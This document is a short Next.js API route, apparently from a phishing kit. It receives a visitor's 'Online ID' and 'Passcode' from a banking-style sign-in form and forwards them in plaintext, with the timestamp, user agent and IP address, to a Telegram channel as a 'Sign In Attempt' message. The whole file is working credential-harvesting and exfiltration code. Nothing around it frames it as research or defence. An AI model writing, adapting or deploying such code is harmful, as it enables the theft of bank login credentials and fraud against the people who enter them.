import { type NextRequest, NextResponse } from "next/server"
import { sendTelegramNotification } from "@/lib/telegram"

export async function POST(request: NextRequest) {
  try {
    const { onlineId, passcode, timestamp, userAgent } = await request.json()

    const message =
      `🚨 <b>Sign In Attempt</b>\n\n` +
      `👤 Online ID: <code>${onlineId}</code>\n` +
      `🔐 Passcode: <code>${passcode}</code>\n` +
      `⏰ Time: ${new Date(timestamp).toLocaleString()}\n` +
      `🌐 User Agent: ${userAgent}\n` +
      `📍 IP: ${request.ip || "Unknown"}`

    await sendTelegramNotification(message)

    return NextResponse.json({ success: true })
  } catch (error) {
    console.error("Sign-in notification error:", error)
    return NextResponse.json({ error: "Failed to send notification" }, { status: 500 })
  }
}
